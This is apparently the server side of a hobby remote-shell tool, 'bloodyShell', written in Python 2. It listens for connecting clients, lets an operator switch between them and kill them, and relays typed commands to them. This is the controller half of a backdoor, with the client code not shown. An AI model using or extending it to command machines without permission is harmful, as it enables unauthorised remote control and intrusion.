#!/usr/bin/env python
# coding: utf-8
import argparse
import readline
import socket
import time

import commands
import serverstuff
from extras import common
from extras import passive
# other imports?

BANNER = u'''
    ____  __                __        _____ __         ____
   / __ )/ /___  ____  ____/ /_  __  / ___// /_  ___  / / /
  / __  / / __ \/ __ \/ __  / / / /  \__ \/ __ \/ _ \/ / / 
 / /_/ / / /_/ / /_/ / /_/ / /_/ /  ___/ / / / /  __/ / /  
/_____/_/\____/\____/\__,_/\__, /  /____/_/ /_/\___/_/_/   
                          /____/                         
   A (nearly) Useless Shell that'll have you cursing.
'''

def get_parser():
    parser = argparse.ArgumentParser(description='bloody(S)hell server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    parser.add_argument('-f', '--file-port', help='Port for upload and download',
                        default=1338, type=int)
    return parser
    
def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    port    = args['port']
    fport   = args['file_port']

    # print banner all sexy like
    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print line
        
    server = serverstuff.Server(port)
    server.setDaemon(True)
    server.start()
    print "Server is listening on {}...".format(port)
    
    # not sent to client. Server side commands
    passive_commands = {
        'client': server.select_client,
        'clients': server.listClients,
        'rename': server.renameClient,
        'quit': passive.quit,
        'help': passive.help
    }
    
    while True:
        try:
            x = server.currentClient.uid
        except AttributeError:
            x = '?'
        promptstr = '\n[{}] bloodyShell> '.format(x)

        prompt = raw_input(promptstr).rstrip()

        # allow noop
        if not prompt: continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        ###########################
        ### THE real code here ####
        ###########################
        if cmd in passive_commands:
            runMe = passive_commands[cmd]
            runMe(action)

        elif cmd in commands.active:
            server.currentClient.conn.send(prompt)
            print server.currentClient.conn.recv(4096)

        # Special Cases
        elif cmd == "kill":
            if action:
                name = action
            else:
                name = server.currentClient.uid
                server.currentClient = None

            try:
                server.clients[name].conn.send(prompt)
                server.clients[name].conn.close()
                server.remove_client(name)
            except KeyError:
                print "that client doesnt exist. [No action taken]"

        elif cmd == "shell":
            pass

        else:
            print "That command isnt correct or unsupported."

if __name__=="__main__":
    main()